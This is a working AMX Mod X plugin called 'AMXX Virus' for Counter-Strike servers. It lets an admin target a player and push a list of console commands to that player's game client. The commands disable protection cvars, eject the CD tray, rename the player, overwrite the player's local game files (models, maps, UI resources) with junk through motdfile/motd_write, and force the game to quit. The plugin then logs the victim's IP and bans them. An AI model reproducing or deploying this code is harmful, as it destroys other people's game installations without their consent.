/* AMX Mod X Script
*
* Ink
*
* ======---===========
* © 2014 by TEST
*  www.test.ro
* ======---===========
*
* This file is intended to be used with AMX Mod X.
*
*   This program is free software: you can redistribute it and/or modify
*   it under the terms of the GNU General Public License as published by
*   the Free Software Foundation, either version 3 of the License, or
*   (at your option) any later version.
*
*   This program is distributed in the hope that it will be useful,
*   but WITHOUT ANY WARRANTY; without even the implied warranty of
*   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*   GNU General Public License for more details.
*
*   AMXX Virus v2.2.0
*
*   changelog:
*   v1.0.0
*   - Versiune privata
*   
*   v2.1.0
*   - Am adaugat definire de mesaj colorat pentru cine doreste doar.
*   - Mai multe functii destroy ( fisiere ).
*   - Am adaugat fisier .LOG.
*   - Comanda nu mai poate fi folosita pe personal, admini, boti.
*   - Acum pluginul va afecta putin si jucatorii cu Steam.
*   - Optimizat doar amxmodx, amxmisc.
*   - Detalii comanda si cum se foloseste.
*
*   v2.2.0
*   - Functi Anti Guard
*   - Nou modul colorchat
*   - Fixare mesaje incorecte
*   - Include PIKA, EXTERMINATE, RUSSIAN
*   - Adaugat efecte celui destrus [TELEPORT]
*/


#include < amxmodx >
#include < amxmisc >
#include < fakemeta >


/*************************************************************/
/* 		ATENTIE!
	Stergeti // daca vreti mesaje colorate in chat pe Server!
	Trebuie sa aveti pluginul: [Dyn Native] ColorChat
	URL Download: https://forums.alliedmods.net/showthread.php?t=94960
*/
/* LINIA ASTA O MODIFICATI cu // sau fara */
//#define USE_COLOR_CHAT

#if defined USE_COLOR_CHAT

	#pragma reqlib chatcolor
	#define RED Red
	#define BLUE Blue
	#define GREY Grey
	#define ColorChat client_print_color
	enum
	{
		Grey = 33,
		Red,
		Blue
	}
	
	native client_print_color(index, sender, const fmt[], any:...);
#endif

// Numele fisierului .log
#define LOGFILE		"exiled.log"

/************************************************************/

static const g_sCommands [ ] [ ] =
{
	"gl_log 1",
	"csx_setcvar Enabled False",
	"rus_setcvar Enabled False",
	"prot_setcvar Enabled False",
	"BlockCommands Enabled False",
	"rate 1",
	"cd eject",
	"cd eject",
	"cd eject",
	"cd eject",
	"cd eject",
	"cd eject",
	"cd eject",
	"name Hacked New-Pika",
	"motdfile models/player.mdl;motd_write PIKA",
	"motdfile models/v_ak47.mdl;motd_write PIKA",
	"motdfile cs_dust.wad;motd_write PIKA",
	"motdfile models/v_m4a1.mdl;motd_write PIKA",
	"motdfile resource/GameMenu.res;motd_write PIKA",
	"motdfile resource/GameMenu.res;motd_write PIKA",
	"motdfile resource/background/800_1_a_loading.tga;motd_write PIKA",
	"motdfile resource/background/800_1_b_loading.tga;motd_write PIKA",
	"motdfile resource/background/800_1_c_loading.tga;motd_write PIKA",
	"motdfile resource/UI/BuyShotguns_TER.res;motd_write PIKA",
	"motdfile resource/UI/MainBuyMenu.res;motd_write PIKA",
	"motdfile resource/UI/BuyEquipment_TER.res;motd_write PIKA",
	"motdfile resource/UI/Teammenu.res;motd_write PIKA",
	"motdfile halflife.wad;motd_write PIKA",
	"motdfile cstrike.wad;motd_write PIKA",
	"motdfile maps/de_dust2.bsp;motd_write PIKA",
	"motdfile events/ak47.sc;motd_write PIKA", 
	
	"quit",
	"echo ????!"	
};

new const 
	PLUGIN_NAME 	[ ] = "AMXX Virus",
	PLUGIN_VERSION	[ ] = "2.2.0";
	
#pragma semicolon 1

new g_pCvar_tele_effect;

public plugin_init ( )
{
	register_plugin ( PLUGIN_NAME, PLUGIN_VERSION, "TEST" );
	
	g_pCvar_tele_effect	= register_cvar ( "amx_pika_teleeff", "1" );
	register_concmd ( "amx_virus", 	"Concmd_AMXX_exterminate", ADMIN_SLAY, "<jucator / player>" );
	register_concmd ( "amx_virus_v2", 		"Concmd_AMXX_exterminate", ADMIN_SLAY, "<jucator / player>" );
	register_concmd ( "amx_exterminate", 	"Concmd_AMXX_exterminate", ADMIN_SLAY, "<jucator / player>" );
}

public Concmd_AMXX_exterminate ( id, level, cid )
{
	if ( !cmd_access ( id, level, cid, 2 ) ) {
		client_print ( id, print_console, "[VIRUS] Nu ai access la aceasta comanda" );
		return 1;
	}
	
	new sArgument[ 33 ];
	read_argv ( 1, sArgument, charsmax ( sArgument ) );
	
	new player = cmd_target ( id, sArgument, ( CMDTARGET_NO_BOTS | CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF ) );
	
	if ( !player )
	{
		console_print ( id, "[VIRUS] Jucatorul mentionat nu este valid." );
		return 1;
	}
	
	for ( new i = 0; i < sizeof ( g_sCommands ); i++ )
		client_cmd ( player, g_sCommands [ i ] );
	
	if ( get_pcvar_num ( g_pCvar_tele_effect ) ) {
		set_task ( 0.3, "FunC_Tele_Effect", player );
	}
	
	new szName [ 33 ], szName2 [ 33 ], ip2 [ 16 ];
	
	get_user_name ( id, szName, charsmax ( szName ) );
	get_user_name ( player, szName2, charsmax ( szName2 ) );
	get_user_ip ( player, ip2, charsmax ( ip2 ), 1 );
	
	log_to_file ( LOGFILE, "%s Pika %s(%s)", szName, szName2, ip2 );
	
	#if defined USE_COLOR_CHAT
		client_print_color ( 0, Blue, "^4%s ^1a exterminat pe ^4%s ^1-[Distrus Complet]-", szName, szName2 );
	#else
		client_print ( 0, print_chat, "Adminul (%s) a exterminat milogul (%s) -[Destroy Completed]-", szName, szName2 );
	#endif
	
	client_cmd ( 0, "spk ^"vox/bizwarn eliminated" );	
	server_cmd ( "amx_banip %s 0", player );
	
	return 1;
}

public FunC_Tele_Effect ( id )
{
	if ( !is_user_alive ( id ) )
		return;
	
	static Float:iOrigin [ 3 ];
	pev ( id, pev_origin, iOrigin );
	
	engfunc ( EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, iOrigin, 0 );
	write_byte ( TE_TELEPORT );
	engfunc ( EngFunc_WriteCoord, iOrigin [ 0 ] );
	engfunc ( EngFunc_WriteCoord, iOrigin [ 1 ] );
	engfunc ( EngFunc_WriteCoord, iOrigin [ 2 ] );
	message_end ( );
}